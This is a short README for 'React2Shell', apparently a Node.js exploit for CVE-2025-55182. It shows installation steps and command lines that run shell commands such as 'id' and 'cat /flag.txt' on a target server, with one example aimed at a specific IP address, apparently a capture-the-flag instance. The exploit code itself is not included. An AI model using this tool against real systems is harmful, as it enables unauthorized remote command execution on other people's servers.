# React2Shell Exploit - CVE-2025-55182

**Author:** andrei2308

## Install
```bash
npm install
```

## Usage
```bash
node exploit.js -t <target_url> <command>
```

## Examples
```bash
node exploit.js -t http://94.237.120.112:48520 "id"
node exploit.js -t http://target.com:3000 "cat /flag.txt"
node exploit.js -t http://target.com:3000 "ls -la"
```

## Help
```bash
node exploit.js --help
```

## Disclaimer

For educational purposes only. Unauthorized access is illegal.
